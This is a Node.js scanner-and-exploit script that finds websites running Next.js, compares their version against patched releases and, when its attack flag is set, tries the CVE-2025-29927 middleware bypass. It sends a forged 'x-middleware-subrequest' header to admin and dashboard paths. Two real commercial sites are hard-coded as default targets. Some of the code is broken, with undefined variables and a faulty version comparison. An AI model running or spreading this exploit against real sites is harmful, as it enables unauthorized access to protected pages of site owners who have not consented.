const puppeteer = require('puppeteer');
const yargs = require('yargs');
const fs = require('fs');

const argv = yargs
  .option('u', {
    alias: 'urls',
    description: 'List of URLs separated by space or comma',
    type: 'string'
  })
  .option('f', {
    alias: 'file',
    description: 'A file with URLs, one for each line',
    type: 'string'
  })
  .option('c', {
    alias: 'chrome',
    description: 'Chromium Path',
    default: '/snap/bin/chromium',
    type: 'string'
  })
  .option('o', {
    alias: 'output',
    description: 'Output file of vulnerable sites',
    type: 'string'
  })
  .option('v', {
    alias: 'verbose',
    description: 'A small description of the process'
  })
  .option('r', {
    alias: 'redirect',
    description: 'Follow redirect (not recommended might lead to false positives)'
  })
  .option('a', {
    alias: 'attack',
    description: 'It will try to exploit the vulnerability'
  })
  .option('w', {
    alias: 'wordlist',
    description: 'A wordlist of paths'
  })
  .option('t', {
    alias: 'headless',
    description: 'If the t flag or headless flag is set, it will launch a headless puppeteer.',
  })
  .option('x', {
    alias: 'headers',
    description: 'It will try with middleware:middleware:middleware:middleware:middleware first; in case it fails. It will retry with src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'
  })
  .help('help').alias('h', 'help').argv;

const WEBSITES = argv.u ? argv.u.split(/[\s,]+/).map(url => url.trim()) : argv.f ? fs.readFileSync(argv.f, 'utf8').split('\n').map(url => url.trim()).filter(Boolean) : [
  'https://www.boxeurdesrues.com', 'https://www.sportsshoes.com/',
];

const VERSIONS_PATCHED = ['15.2.3', '14.2.25', '13.5.9', '12.3.5'];

const log = (message, colorCode='\x1b[0m') => {
  if (argv.v) console.log(`${colorCode}${message}\x1b[0m`);
};

async function checkFrameWork(url){
  try {
    let response = await fetch(url);
    const headers = Object.fromEntries(response.headers.entries());
    const body = await response.text();
    const isNextHeader = headers['x-powered-by'] === 'Next.js';
    const hasNextData = body.includes('__NEXT_DATA__');
    const matchesNextPaths = body.match(/\/_next\/[^"'\s]+/g) || [];
    const linkHeader = headers['link'] || '';
    const preloadsNext = linkHeader.includes('/_next/');
    const isLikelyNext =
      isNextHeader ||
      hasNextData ||
      matchesNextPaths.length > 0 ||
      preloadsNext;

    if (isLikelyNext){
      log(`${url} is using Next.js`);
      return true
    }else {
      log(`${url} doesn't use Next.js no vulnerability detected`, '\x1b[32m');
      return false
    }
  } catch (e) {
    if (e.message == 'fetch failed') {
      return null
    }
    console.error(e.message, e);
  }
};

let vulnerableWebsites = [];
let exploitedSites = [];
let info = {};

function getCompanyName(url){
    return new URL(url).hostname.split('.').length > 2 ? new URL(url).hostname.split('.')[1] : new URL(url).hostname.split('.')[0];
}

async function checkNextJsVersion(url, browser){
  const page = await browser.newPage();
  let hostname = getCompanyName(url);
  info[hostname] = {
    version : '',
    url: url,
    result: '',
    exploitedUrls: [],
    errors: []
  }
  try {
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 15000 });

    const nextVersion = await page.evaluate(() => window.next?.version || 'not found');

    if (nextVersion == 'not found' || nextVersion.indexOf(VERSIONS_PATCHED) < 0) {
      log(`${url} is running Next.js version: ${nextVersion}.\nPotentially vulnerable to CVE-2025-29927.`, '\x1b[31m');
      vulnerableWebsites.push(`${url} -> version: ${nextVersion}`);
      info[hostname].version = nextVersion;
    }else {
      log(`${url} is using a patched version (${nextVersion})`, '\x1b[32m');
      info[hostname].version = nextVersion;
      info[hostname].result = 'Patched Version';
    }
  } catch (e) {
    info[hostname].errors.push({message: e.message, code: e.code, info: `Error checking Next.js version for ${url}`})
  } finally {
    await page.close();
  }
}

async function attack(ws, headers){
  let url = ws.split(' ')[0];
  let hostname = getCompanyName(url);
  log(`Attacking ${url}`);
  let wordlist = argv.w ? fs.readFileSync(argv.w, 'utf8').split('\n').map(word => word.trim()).filter(Boolean) : ['admin', 'dashboard']
  for (let i = 0; i < wordlist.length; i++) {
    let exploitUrl = url.endsWith('/') ? `${url}${wordlist[i]}` : `${url}/${wordlist[i]}`;
    try {
      let response = await fetch(exploitUrl, {
        'method': 'GET',
        headers: {
          'x-middleware-subrequest': headers
        },
        redirect: argv.r ? 'follow' : 'manual',
        keepalive: false
      });
      if (response.status == 200){
        exploitedSites.push(exploitUrl);
        info[hostname].result = 'Exploited';
        info[hostname].exploitedUrls.push(exploitUrl)
        info[hostname].headers = headers;
      }
    } catch (e) {
      info[hostname].errors.push({message: e.message, code: e.code, info: `Error attacking`})
    }
  }
}

async function checkWebsites() {
  log('\nStarting security analysis...\n');
  const browser = await puppeteer.launch({
    executablePath: argv.c,
    headless: argv.t ? 'new' : false,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-blink-features=AutomationControlled',
      '--start-maximized',
    ],
    defaultViewport: null
  });

  const tasks = WEBSITES.map(async (url) => {
    try {
      log(`Analysing: ${url}`);
      const usesNextJs = await checkFrameWork(url);
      if (!usesNextJs) return;
      log(`Checking Next.js version of ${url}`);
      await checkNextJsVersion(url, browser)
    } catch (e) {
      console.error(`Unexpected Error. ${e}`);
    } finally {
      await page.close();
    }
  });
  await Promise.allSettled(tasks);
  await browser.close();

  if (argv.a) {
    const attacks = vulnerableWebsites.map(async (ws) => {
      await attack(ws, 'middleware:middleware:middleware:middleware:middleware');
      if (info[hostname].result != 'Exploited' && argv.x) {
        await attack(ws, 'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware');
      }
    });
    await Promise.allSettled(attacks);
  }
}

checkWebsites().then((res) => {
  log('\nFinal Results\n');
  log(`Potential Vulnerable Sites:`, '\x1b[31m');
  if (argv.v) {
    results = argv.a ? exploitedSites : vulnerableWebsites;
    for (let i = 0; i < results.length; i++) {
      log(`${results[i]}`, '\x1b[31m');
    }
  }
  if (argv.o) fs.writeFileSync(argv.o, results.join('\n'), 'utf8');
  if (!argv.v) process.stdout.write(JSON.stringify(info));
  process.exit(0)
}).catch(err => console.error(err));
